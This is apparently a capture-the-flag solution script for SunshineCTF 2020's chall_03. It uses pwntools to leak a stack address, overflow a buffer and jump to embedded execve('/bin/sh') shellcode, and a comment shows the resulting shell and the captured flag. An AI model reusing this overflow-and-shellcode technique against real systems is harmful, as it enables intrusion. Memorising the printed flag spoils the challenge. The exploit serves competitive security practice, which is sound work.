from pwn import *

p = remote('chal.2020.sunshinectf.org', 30003)
#p = process('./chall_03')

e = ELF('./chall_03')

p.readline()

p.send('a'*0x12)

#eat string
p.recv(14)

leak = int(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'), 16)

print('leak: 0x%.8x' %(leak))

input('...')

line = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
line += b'a'*93
line += p64(leak)
line += b'\n'

p.send(line)

p.interactive()

'''
[+] Opening connection to chal.2020.sunshinectf.org on port 30003: Done
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_03'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
leak: 0x7fff256d0db0
...
[*] Switching to interactive mode
$ ls
chall_03
flag.txt
$ cat flag.txt
sun{a-little-piece-of-heaven-26c8795afe7b3c49}
'''
